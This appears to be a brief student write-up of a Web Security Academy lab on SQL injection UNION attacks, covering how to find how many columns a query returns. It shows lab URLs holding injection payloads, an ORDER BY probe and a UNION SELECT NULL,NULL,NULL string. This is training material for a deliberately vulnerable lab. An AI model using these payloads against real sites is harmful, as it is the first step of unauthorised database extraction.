Lab: SQL injection UNION attack, determining the number of columns returned by the query
Level: PRactitioner

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing an SQL injection UNION attack that returns an additional row containing null values.



https://ac831f5b1f0e6f77c08433a600cb0045.web-security-academy.net/filter?category=%27order+by+3--

Solution: UNION+SELECT+NULL,NULL,NULL--


https://ac831f5b1f0e6f77c08433a600cb0045.web-security-academy.net/filter?category=accesories%27UNION+SELECT+NULL,NULL,NULL--


